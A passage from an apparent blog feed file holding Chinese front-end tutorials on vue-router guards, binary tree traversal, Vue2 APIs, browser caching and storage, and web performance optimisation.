&#125;,</span><br><span class="line">      beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// 在当前路由改变，但是该组件被复用时调用 可以访问组件实例 `this`</span></span><br><span class="line">        <span class="comment">// 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，</span></span><br><span class="line">        <span class="comment">// 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。</span></span><br><span class="line">      &#125;,</span><br><span class="line">      beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// 导航离开该组件的对应路由时调用，可以访问组件实例 `this`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-3-组件级守卫"><a href="#4-3-组件级守卫" class="headerlink" title="4.3 组件级守卫"></a>4.3 组件级守卫</h4><p>参数或查询的改变并不会触发进入/离开的导航守卫。你</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5b35dcb5f265da59a117344d" target="_blank" rel="noopener">vue-router 源码：实现一个简单的 vue-router</a></li><li><a href="https://juejin.im/post/58b6bb8044d904006ac40c78" target="_blank" rel="noopener">「前端」History API与浏览器历史堆栈管理</a></li><li><a href="https://juejin.im/post/5b5697675188251b11097464" target="_blank" rel="noopener">VueRouter 源码深度解析</a></li><li><a href="https://juejin.cn/post/6844903641866829838" target="_blank" rel="noopener">Vue的钩子函数[路由导航守卫、keep-alive、生命周期钩子]</a></li><li><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">Vue-Router文档</a></li><li><a href="https://juejin.cn/post/6844904064367460366" target="_blank" rel="noopener">带你全面分析vue-router源码</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>树、二叉树、二叉搜索树</title>
      <link href="/2019/10/19/Leetcode-%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2019/10/19/Leetcode-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      <content type="html"><![CDATA[<h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h3><ul><li>树: parentNode, childrenNode</li><li>二叉树：儿子节点只有两个 - 左节点、右节点</li><li>二叉搜索树：左子树上所有结点的值均小于它的根节点的值；右子树上所有结点的值均大于它的根节点的值。查询和操作都是<code>O(logn)</code></li></ul><p>节点定义<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.val = val</span><br><span class="line">  <span class="keyword">this</span>.left = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">this</span>.right = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-树的遍历"><a href="#2-树的遍历" class="headerlink" title="2. 树的遍历"></a>2. 树的遍历</h3><p>树的解法一般都是递归</p><h4 id="2-1-前序遍历"><a href="#2-1-前序遍历" class="headerlink" title="2.1 前序遍历"></a>2.1 前序遍历</h4><p>先访问当前节点，然后左节点，右节点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> preorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  path.push(node.val)</span><br><span class="line">  preorder(node.left)</span><br><span class="line">  preorder(node.right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="2-2-中序遍历"><a href="#2-2-中序遍历" class="headerlink" title="2.2 中序遍历"></a>2.2 中序遍历</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> inorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  inorder(node.left)</span><br><span class="line">  path.push(node.val)</span><br><span class="line">  inorder(node.right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-后序遍历"><a href="#2-3-后序遍历" class="headerlink" title="2.3 后序遍历"></a>2.3 后序遍历</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> backorder = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  backorder(node.left)</span><br><span class="line">  backorder(node.right)</span><br><span class="line">  path.push(node.val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-LeetCode"><a href="#3-LeetCode" class="headerlink" title="3. LeetCode"></a>3. LeetCode</h3><h4 id="爬楼梯"><a href="#爬楼梯" class="headerlink" title="爬楼梯"></a>爬楼梯</h4><h4 id="括号生成等问题"><a href="#括号生成等问题" class="headerlink" title="括号生成等问题"></a>括号生成等问题</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue2 的 API 是真的好用！</title>
      <link href="/2019/10/11/Vue%20API/"/>
      <url>/2019/10/11/Vue%20API/</url>
      <content type="html"><![CDATA[<h3 id="1-Data"><a href="#1-Data" class="headerlink" title="1. Data"></a>1. Data</h3><p><em>Data 为什么是一个函数，而不是对象？</em><br>为了方便初始化data，直接<em><code>this.data = vm.$options.data()</code></em>就可以拿到一份新的data，不用深拷贝一个 data，方便安全。避免多个组件实例对象之间公用一个<code>data</code>,产生数据污染。</p><p><br></p><h3 id="2-NextTick"><a href="#2-NextTick" class="headerlink" title="2. NextTick"></a>2. NextTick</h3><p>数据在发生变化的时候，<code>vue</code>不会立刻去更新<code>DOM</code>，而是将修改数据的操作放在一个操作队列中。如果我们一直修改一个数据，异步操作队列还会进行去重，等同一事件循环中的所有数据变化完成后，才会进行<code>DOM</code>的更新。</p><p><em>NextTick原理</em></p><ul><li>把回调函数放入callbacks等待执行</li><li>将待执行函数放到<code>Promise.then</code>微任务操作</li><li>事件循环到了微任务，执行函数依次执行callbacks中的回调<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有nextTick机制，num每次更新值都会触发视图更新。有了nextTick，只需更新一次</span></span><br><span class="line">&#123;&#123; num &#125;&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">num = i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-Slot"><a href="#3-Slot" class="headerlink" title="3. Slot"></a>3. Slot</h3><p><code>Slot</code>插槽，又名“占坑”，可以理解为在组件中占好了位置，允许你自动往里面填坑。<br>通过<code>slot</code>插槽向组件传递props，<code>slot</code>是Vue2 实现逻辑复用的重要方式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Mouse v-slot=<span class="string">"&#123;x, y&#125;"</span>&gt;&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;&lt;<span class="regexp">/Mouse&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-Virtual-Dom"><a href="#4-Virtual-Dom" class="headerlink" title="4. Virtual Dom"></a>4. Virtual Dom</h3><ul><li>掩盖底层的DOM操作<br>让你用更声明式的方式来描述你的目的，让你的代码更容易维护。当然，没有任何框架可以比纯手动的优化 DOM 操作更快。</li><li>对渲染过程的抽象<br>使得框架可以渲染到web以外的平台，如移动端React Native、WebGL、SSR。</li><li>数据频繁变更后的合并处理 + Diff：减少重排重绘<ol><li>虚拟 DOM 不会立马进行排版与重绘操作</li><li>虚拟 DOM 进行频繁修改，然后一次性比较并修改真实 DOM 中需要改的部分，最后在真实 DOM 中进行排版与重绘，减少过多DOM节点排版与重绘损耗</li><li>虚拟 DOM 有效降低大面积真实 DOM 的重绘与排版，因为最终与真实 DOM 比较差异，可以只渲染局部</li></ol></li></ul><p><br></p><h3 id="5-Mixin"><a href="#5-Mixin" class="headerlink" title="5. Mixin"></a>5. Mixin</h3><p><code>Mixin</code>是一个js对象，它可以包含组件中任意功能选项，如<code>data</code>, <code>components</code>, <code>methods</code>, <code>created</code>, <code>computed</code>等。<br>当组件使用<code>mixins</code>时，这些选项都会被混入该组件本身的选项中。</p><p><em>Mixin怎么混入当前组件？Mixin的合并策略</em></p><ul><li>替换型策略有props、methods、inject、computed，就是将新的同名参数替代旧的参数</li><li>合并型策略是data, 通过set方法进行合并和重新赋值</li><li>队列型策略有生命周期函数和watch，原理是将函数存入一个数组，然后正序遍历依次执行</li><li>叠加型有component、directives、filters，层层的叠加<br>(源码位置：/src/core/global-api/mixin.js)</li></ul><p><br></p><h3 id="6-Keep-alive"><a href="#6-Keep-alive" class="headerlink" title="6. Keep-alive"></a>6. Keep-alive</h3><p><code>Keep-alive</code>是<code>vue</code>中的一个内置组件，用于缓存组件，能在组件切换过程中将组件保留在内存中。<br>缓存<code>vnode.componentInstance</code>组件实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;<span class="xml"><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Directive"><a href="#7-Directive" class="headerlink" title="7. Directive"></a>7. Directive</h3><p>内置指令：</p><ul><li>v-html: 插入html</li><li>v-bind: 绑定一个属性 <code>v-bind:id=&quot;app&quot;</code> 等同于 <code>:id=&quot;app&quot;</code></li><li>v-on: 绑定事件, <code>v-on:click=&quot;&quot;</code> 等同于 <code>@click=&quot;&quot;</code></li><li>v-model: 双向绑定，<code>this.$data.foo = a</code> 和 <code>this.$emit</code>可以触发更新<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue.directive(<span class="string">'focus'</span>, &#123;</span><br><span class="line">  bind: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// 指令第一次绑定到元素时</span></span><br><span class="line">  unbind: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// 指令与元素解绑时</span></span><br><span class="line">  inserted: <span class="function">(<span class="params">el</span>) =&gt;</span> &#123; <span class="comment">// 元素插入父节点时（不一定已被插入文档中）</span></span><br><span class="line">    el.focus()</span><br><span class="line">  &#125;,</span><br><span class="line">  update: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, <span class="comment">// 所在组件的VNode更新时</span></span><br><span class="line">  componentUpdated: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125; <span class="comment">// 所在组件的 VNode 及其子 VNode 全部更新后调用</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>自定义指令：</p><ul><li><p>v-title<br>文本有省略号…显示title，没有则不显示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showOverflowTitle</span>(<span class="params">el: HTMLElement, binding: &#123; value: string &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (el.title) <span class="keyword">return</span></span><br><span class="line">  el.title =</span><br><span class="line">    el.scrollWidth &gt; el.offsetWidth || el.scrollHeight &gt; el.offsetHeight</span><br><span class="line">      ? binding.value</span><br><span class="line">      : <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.directive(<span class="string">'title'</span>, &#123;</span><br><span class="line">  mounted(el, binding) &#123;</span><br><span class="line">    el.addEventListener(<span class="string">'mouseover'</span>, showOverflowTitle.bind(<span class="keyword">this</span>, el, binding))</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted(el) &#123;</span><br><span class="line">    el.removeEventListener(<span class="string">'mouseover'</span>, showOverflowTitle)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;span v-title=<span class="string">"item.name"</span>&gt;&#123;&#123; item.name &#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>v-hideIfOverflow<br>如果div有滚动条就隐藏</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hideOverflowElement</span>(<span class="params">el: HTMLElement</span>) </span>&#123;</span><br><span class="line">  el.style.opacity = el.scrollWidth &gt; el.offsetWidth ? <span class="string">'0'</span> : <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">app.directive(<span class="string">'hideIfOverflow'</span>, &#123;</span><br><span class="line">  mounted(el) &#123;</span><br><span class="line">    el.style.opacity = el.scrollWidth &gt; el.offsetWidth ? <span class="number">0</span> : <span class="number">1</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, hideOverflowElement.bind(<span class="keyword">this</span>, el))</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'resize'</span>, hideOverflowElement)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="8-Template"><a href="#8-Template" class="headerlink" title="8. Template"></a>8. Template</h3><p>为什么我支持模板而不是JSX</p><ul><li>JSX提供更高的自由度，实际应该避免使用这种自由度。</li><li>模板驱使程序员写m v vm分离的代码，前端开发的不良设计经常是混淆v和vm导致的</li><li>template更有利于点对点粒度的更新触发，而jsx只能以组件为粒度触发vdom diff</li></ul><p><br></p><h3 id="9-Computed"><a href="#9-Computed" class="headerlink" title="9. Computed"></a>9. Computed</h3><p><code>Computed</code>在注册阶段，触发响应式数据的getter从而完成依赖收集</p><p><em>computed为什么会被缓存</em><br>某个计算属性C，它依赖data中的A，如果没有缓存的话，每次读取C时，C都回去读取A，从而触发A的get。多次触发A的get有时候是一个非常消耗性能的操作。所以Computed必须要有缓存。</p><p><br></p><h3 id="10-Watch"><a href="#10-Watch" class="headerlink" title="10. Watch"></a>10. Watch</h3><p><code>watch</code>在注册阶段，触发响应式数据的getter从而完成依赖收集</p><p><br></p><h3 id="11-生命周期"><a href="#11-生命周期" class="headerlink" title="11. 生命周期"></a>11. 生命周期</h3><p>Vue实例从创建到销毁的过程，就是生命周期，从开始创建、初始化数据、编译模板、挂载DOM -&gt; 更新渲染 -&gt; 卸载等一系列的过程。</p><ul><li>组件挂载: beforeCreate, created, beforeMount, mounted(完成DOM渲染， 官方实例的异步请求在mounted中调用，实际上created也可以)</li><li>组件更新: beforeUpdate, updated</li><li>组件卸载: beforeDestroy, destroyed</li></ul><p>beforeCreate<br>组件实例被创建之初，组件的属性生效之前</p><p>created<br>组件实例已经完全创建，属性也绑定，但真实dom还没有生成，$el还不可用</p><p>beforeMount<br>在挂载开始之前被调用：相关的 render 函数首次被调用</p><p>mounted<br>el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子</p><h3 id="12-生命周期执行顺序"><a href="#12-生命周期执行顺序" class="headerlink" title="12. 生命周期执行顺序"></a>12. 生命周期执行顺序</h3><p>想象有一段JSX，组件<code>&lt;ComponentA&gt;</code>会被<code>babel-loader</code>转换成<code>createElement</code>，执行<code>render()</code>的时候，会深度优先遍历（DFS）依次从父组件往里面执行，然后再依次往回<code>return</code>。</p><p>加载渲染过程</p><ol><li>父beforeCreate</li><li>父created</li><li>父beforeMount</li><li>子beforeCreate</li><li>子created</li><li>子beforeMount</li><li>子mounted</li><li>父mounted</li></ol><p>子组件更新过程：</p><ol><li>父beforeUpdate</li><li>子beforeUpdate</li><li>子updated</li><li>父updated</li></ol><p>销毁过程：</p><ol><li>父beforeDestroy</li><li>子beforeDestroy</li><li>子destroyed</li><li>父destroyed</li></ol><p><br></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://github.com/febobo/web-interview" target="_blank" rel="noopener">JS每日一题</a></li><li><a href="https://juejin.cn/post/6906028995133833230" target="_blank" rel="noopener">分享8个非常实用的Vue自定义指令</a></li><li><a href="https://github.com/theydy/notebook/issues" target="_blank" rel="noopener">notebook</a></li><li><a href="https://www.ruanyifeng.com/blog/2015/05/require.html" target="_blank" rel="noopener">require()源码解读</a></li><li><a href="https://blog.csdn.net/lznism666/article/details/108513723" target="_blank" rel="noopener">Vue中computed原理分析</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浏览器缓存（强缓存、协议缓存）、离线缓存</title>
      <link href="/2019/10/08/%E7%BC%93%E5%AD%98/"/>
      <url>/2019/10/08/%E7%BC%93%E5%AD%98/</url>
      <content type="html"><![CDATA[<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p><em>碰到的缓存问题…</em></p><ul><li>每次都加载同样的静态文件？</li><li>协商缓存还是要和服务器通信，怎样可以省掉这个请求？</li><li>这些数据、文件的有效时间要怎么定，会不会太容易失效？</li><li>重复的无效请求太多？数据需要缓存起来，应该放在那里？</li><li>如何更新缓存，更新的依据是什么？</li><li>什么是Memory Cache, Disk Cache, Push Cache</li></ul><p><strong>这里罗列了缓存的所有分类..</strong><br><img src="/2019/10/08/缓存/1.png"></p><p><br></p><p><br></p><h3 id="2-HTTP-header缓存机制"><a href="#2-HTTP-header缓存机制" class="headerlink" title="2. HTTP header缓存机制"></a>2. HTTP header缓存机制</h3><h4 id="2-1-状态码"><a href="#2-1-状态码" class="headerlink" title="2.1 状态码"></a>2.1 状态码</h4><p>浏览器根据第一次请求资源时返回的 <em>响应头</em> 来确定，一个资源该不该被缓存。如果这是个可以被缓存的资源，浏览器会把它存到内存(memory cache)或者磁盘(disk cache)中，同时把缓存标识记录下来。<br><img src="/2019/10/08/缓存/6.png" style="max-width: 500px; margin: 30px auto;"></p><p>第二次请求资源时，会返回这些<em>状态码</em>。</p><table><thead><tr><th>状态码</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>200</td><td style="text-align:center">强缓存 Expires/Cache-Control失效时，并且协议缓存过期，返回新的资源文件</td></tr><tr><td>200(from cache)</td><td style="text-align:center">强缓存 Expires/Cache-Control未过期，浏览器从本地获取资源成功。<br></td></tr><tr><td>304(Not Modified)</td><td style="text-align:center">协商缓存Last-modified/Etag没有过期时，服务端返回状态码304</td></tr></tbody></table><p><img src="/2019/10/08/缓存/5.png" style="max-width: 300px; margin: 20px auto;"></p><p><br><br><br></p><h4 id="2-1-强缓存"><a href="#2-1-强缓存" class="headerlink" title="2.1 强缓存"></a>2.1 强缓存</h4><p>不会向服务器发送请求，直接从缓存中读取资源。强缓存通过Expires和Cache-Control两种响应头实现。</p><p><em>1. Expires</em><br>Expires是HTTP 1.0提出的一个表示资源过期时间的字段，描述一个绝对时间，由服务器返回。Expires受限于本地时间，如果修改了本地时间，可能会造成缓存失效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expires: Wed, 11 May 2018 07:20:00 GMT</span><br></pre></td></tr></table></figure></p><p><br><br><em>2. Cache-Control</em><br>出现于HTTP 1.1，优先级高于Expires， 表示的是相对时间<br><code>Cache-Control: no-store</code> 浏览器和缓存服务器，不缓存数据到本地磁盘中<br><code>Cache-Control: no-cache</code> 浏览器和缓存服务器不应该缓存页面信息<br><code>Cache-Control: public</code> 可以被所有用户缓存，包括终端和CDN等中间代理服务器<br><code>Cache-Control: private</code> 只能被终端浏览器缓存，不允许中继缓存服务器进行缓存<br><code>Cache-Control: max-age=30</code>缓存30秒后就过期，需要重新请求<br><code>Cache-Control: s-maxage=30</code>覆盖max-age，作用一样，只在代理服务器生效</p><p><br></p><h4 id="2-2-协商缓存"><a href="#2-2-协商缓存" class="headerlink" title="2.2 协商缓存"></a>2.2 协商缓存</h4><p>强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存。协商缓存利用<code>Last-Modified</code>, <code>If-Modified-Since</code>和<code>ETag</code>, <code>If-None-Match</code>这两对标识来管理。<br><img src="/2019/10/08/缓存/7.png" style="max-width:600px;margin: 30px auto"></p><p><em>1. Last-Modified， If-Modified-Since</em><br>表示本地文件最后修改日期。<br>浏览器会在request header加上<em><code>If-Modified-Since</code></em>(上次响应头中的Last-Modified)，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来。但是如果在本地打开缓存文件，就会造成Last-Modified被修改，所以在HTTP / 1.1出现了ETag。</p><p><br><br><em>2. ETag, If-None-Match</em><br>ETag像一个指纹，资源变化都会导致ETag变化，它可以保证每一个资源是唯一的。<br>浏览器会在request header加上<em><code>If-None-Match</code></em>(上次相应头中的ETag)发送给服务器，询问该资源的ETag是否有更新，有变动就会发送新的资源回来。</p><p><img src="/2019/10/08/缓存/3.png"></p><p>ETag的优先级比Last-Modified更高，优先使用ETag有下面几种情况考虑：</p><ul><li>一些文件也许会周期性的更改，但它的内容并不改变（仅仅改变的是修改时间）</li><li>某些文件修改非常频繁，If-Modified-Since能检查到的粒度是s级，对于秒以下的修改则无法判断</li><li>某些服务器不能精确的得到文件的最后修改时间</li></ul><p><br></p><h4 id="2-3-缓存策略"><a href="#2-3-缓存策略" class="headerlink" title="2.3 缓存策略"></a>2.3 缓存策略</h4><ul><li>配置超长时间的本地缓存</li><li>采用内容摘要作为缓存更新依据  —— 精确控制缓存</li><li>静态资源部署CDN</li><li>静态资源文件通过Service Worker进行缓存控制和离线化加载</li><li>更新资源实现非覆盖式发布</li></ul><p><strong>具体操作</strong></p><ul><li>对于不需要缓存的资源，使用<em><code>Cache-control: no-store</code></em></li><li>对于频繁变动的资源（比如经常需要刷新的首页，资讯论坛新闻类），可以使用<em><code>Cache-control: no-cache</code></em>并配合<em><code>ETag</code></em>，表示该资源已被缓存，但是每次都会发送请求询问资源是否需要更新</li><li>对于代码文件，通常使用<em><code>Cache-control: max-age=31536000</code></em>强缓存，然后对文件进行指纹处理，一旦文件名变动就会立刻下载新的文件</li></ul><p><br></p><h3 id="3-数据存储"><a href="#3-数据存储" class="headerlink" title="3. 数据存储"></a>3. 数据存储</h3><p>除了请求缓存，我们还会把存储从服务器获取的数据，也是页面需要频繁用到的数据<br><em>cookie</em>：4K，可以手动设置失效期<br><em>localStorage</em>：5M，除非手动清除，否则一直存在<br><em>sessionStorage</em>：5M，不可以跨标签访问，页面关闭就清理<br><em>indexedDB</em> ：浏览器端数据库，无限容量，除非手动清除，否则一直存在</p><p><strong>共同点</strong></p><ul><li>都是保存在浏览器端、且同源的<br><br></li></ul><p><strong>区别</strong></p><ul><li>cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递，而sessionStorage和localStorage不会自动把数据发送给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下</li><li>存储大小限制也不同，cookie数据不能超过4K，同时因为每次http请求都会携带cookie、所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大</li><li>数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭之前有效；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie：只在设置的cookie过期时间之前有效，即使窗口关闭或浏览器关闭</li><li>作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localstorage在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的</li><li>web Storage支持事件通知机制，可以将数据更新的通知发送给监听者。接口使用更方便</li></ul><p><br></p><h3 id="4-离线缓存PWA"><a href="#4-离线缓存PWA" class="headerlink" title="4. 离线缓存PWA"></a>4. 离线缓存PWA</h3><p>使用Service Worker实现离线可用的应用，甚至在离线时，可以应用XHR数据，提高响应速度。<br><a href="">查看Demo</a><br><img src="/2019/10/08/缓存/8.png" style="max-width:500px; margin: 30px auto"></p><ul><li>在index.js中注册Service Worker(sw.js)</li><li>在sw.js中列一个资源列表(离线时显示的页面)，当Server Worker被激活时，将列表中的资源缓存进cache</li><li>拦截浏览器请求：当浏览器请求各类静态资源(html/js/css/img)时， Service Worker拦截该请求，并查询当前cache。若存在cache则直接返回，先渲染数据。然后通过fetch方法向服务端发起请求。</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/amandakelake/blog/issues/43" target="_blank" rel="noopener">缓存总览：从性能优化的角度看缓存</a></li><li><a href="https://blog.csdn.net/garrettzxd/article/details/80684880" target="_blank" rel="noopener">from memory cache与from disk cache详解</a></li><li><a href="https://www.jianshu.com/p/54cc04190252" target="_blank" rel="noopener">深入理解浏览器的缓存机制</a></li><li><a href="https://juejin.im/post/5c4528a6f265da611a4822cc" target="_blank" rel="noopener">实践这一次,彻底搞懂浏览器缓存机制</a></li><li><a href="https://juejin.im/post/5aca14b6f265da237c692e6f" target="_blank" rel="noopener">【PWA学习与实践】(3) 让你的WebApp离线可用</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>性能优化</title>
      <link href="/2019/09/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2019/09/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<p>从输入 URL 到页面加载完成，经历了下面几个步骤，针对这些步骤逐个优化：</p><table><thead><tr><th>优化点</th><th style="text-align:center">问题</th><th style="text-align:right">解决</th></tr></thead><tbody><tr><td>DNS解析</td><td style="text-align:center">减少DNS解析次数，把解析前置？</td><td style="text-align:right">DNS缓存和DNS prefetch</td></tr><tr><td>TCP连接</td><td style="text-align:center">TCP三次握手，时间太久？</td><td style="text-align:right">长连接，预连接，接入SPDY协议</td></tr><tr><td>HTTP请求</td><td style="text-align:center">HTTP请求怎么优化？</td><td style="text-align:right">减少请求次数和请求体积，CDN等网络层面的性能优化</td></tr><tr><td>浏览器渲染</td><td style="text-align:center">拿到内容后，如何加快响应速度？</td><td style="text-align:right">资源加载优化、服务端渲染、浏览器缓存机制、DOM树构建、<br>网页排版和渲染、回流和重绘、DOM操作合理规避等问题。</td></tr></tbody></table><p>总的来说，前端性能优化可以分为 <em>网络层面</em> 和 <em>渲染层面</em> 两个大点。<br><em>终极方案： 服务器渲染SSR</em></p><p><br></p><h3 id="1-网络层面"><a href="#1-网络层面" class="headerlink" title="1. 网络层面"></a>1. 网络层面</h3><h4 id="1-1-HTTP"><a href="#1-1-HTTP" class="headerlink" title="1.1 HTTP"></a>1.1 HTTP</h4><ol><li><p>浏览器缓存</p><ul><li>对于不需要缓存的资源，使用Cache-control: no-store</li><li>对于频繁变动的资源，使用Cache-control: no-cache并配合ETag，表示该资源已被缓存，但是每次都会发送请求询问资源是否需要更新</li><li>对于代码文件，通常使用Cache-control: max-age=31536000强缓存，然后对文件进行指纹处理，一旦文件名变动就会立刻下载新的文件</li></ul></li><li><p>文件压缩<br>在request header中加上<code>accept-encoding:gzip</code></p></li><li><p>资源部署</p><ul><li>多个地址： HTML部署到<code>www.example.org</code>，而把js, css静态资源分离到<code>static.example.org</code>。最大化并行下载（浏览器限制6个）</li><li>cdn加速</li></ul></li></ol><p><br></p><h4 id="1-2-Webpack优化"><a href="#1-2-Webpack优化" class="headerlink" title="1.2 Webpack优化"></a>1.2 Webpack优化</h4><ul><li>分包<ul><li>懒加载</li><li>减少体积过大的模块</li></ul></li><li>压缩，tree shaking, 